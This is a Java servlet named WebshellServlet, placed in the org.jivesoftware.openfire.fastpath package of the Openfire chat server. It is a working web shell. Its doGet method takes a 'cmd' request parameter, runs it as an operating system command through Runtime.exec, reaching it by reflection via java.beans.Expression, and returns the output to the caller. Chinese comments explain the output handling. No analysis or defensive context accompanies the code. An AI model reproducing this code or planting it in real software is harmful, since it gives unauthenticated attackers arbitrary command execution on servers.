package org.jivesoftware.openfire.fastpath;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.beans.Expression;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.BufferedReader;

public class WebshellServlet extends HttpServlet {
    @Override
    public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {
        try {
            res.setContentType("text/plain");
            String cmd = req.getParameter("cmd");
            Expression expr = new Expression(Runtime.getRuntime(), "exec", new Object[]{cmd});
            //返回值是一个process的object
            Process process = (Process) expr.getValue();
            InputStream in = process.getInputStream();

            StringBuilder sb = new StringBuilder();
            //回显的返回结果是一个流，用 InputStreamReader 来读取
            InputStreamReader resultReader = new InputStreamReader(in);
            //再包一层BufferedReader读字符串
            BufferedReader stdInput = new BufferedReader(resultReader);
            String s;
            //BufferedReader的readline逐行字符串
            while ((s = stdInput.readLine()) != null) {
                sb.append(s).append("\n");
            }
            res.getWriter().print(sb);
        } catch (ServletException | IOException e) {
            throw e;
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
    }
}
